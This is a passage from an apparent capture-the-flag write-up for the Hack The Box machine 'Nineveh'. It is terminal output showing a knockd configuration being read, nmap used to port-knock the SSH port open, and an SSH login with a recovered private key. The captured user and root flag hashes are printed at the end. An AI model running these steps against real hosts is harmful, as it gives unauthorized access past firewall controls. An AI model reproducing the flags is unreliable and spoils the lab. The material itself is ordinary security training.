# PLEASE EDIT /etc/knockd.conf BEFORE ENABLING
START_KNOCKD=1

# command line options
KNOCKD_OPTS="-i ens33"
www-data@nineveh:/etc/init.d$
```

```sh
www-data@nineveh:/etc/init.d$ cat /etc/knockd.conf
[options]
 logfile = /var/log/knockd.log
 interface = ens33

[openSSH]
 sequence = 571, 290, 911
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
www-data@nineveh:/etc/init.d$
```

```sh
root@kali:~/nineveh# nmap -p 22 10.10.10.43

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-26 04:39 EST
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up (0.25s latency).

PORT   STATE    SERVICE
22/tcp filtered ssh

Nmap done: 1 IP address (1 host up) scanned in 2.97 seconds
root@kali:~/nineveh#
```

[``Port knocking``](https://wiki.archlinux.org/index.php/Port_knocking)

```sh
root@kali:~/nineveh# for i in 571 290 911; do nmap -Pn -p $i --host_timeout 201 --max-retries 0 10.10.10.43; done

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-26 04:42 EST
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up.

PORT    STATE    SERVICE
571/tcp filtered umeter

Nmap done: 1 IP address (1 host up) scanned in 1.11 seconds

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-26 04:42 EST
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up.

PORT    STATE    SERVICE
290/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-26 04:42 EST
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up.

PORT    STATE    SERVICE
911/tcp filtered xact-backup

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
root@kali:~/nineveh#
```

```sh
root@kali:~/nineveh# nmap -p 22 10.10.10.43

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-26 04:42 EST
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up (0.19s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
root@kali:~/nineveh#
```

```sh
root@kali:~/nineveh/_nineveh.png.extracted/secret# ssh -i nineveh.priv amrois@10.10.10.43
The authenticity of host '10.10.10.43 (10.10.10.43)' can't be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.43' (ECDSA) to the list of known hosts.
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

133 packages can be updated.
66 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ id
uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
amrois@nineveh:~$
```

```sh
# cat root.txt
8a2b4956612b485720694fb45849ec3a
#
```

```sh
# cat user.txt
82a864f9eec2a76c166ec7b1078ca6c8
#
```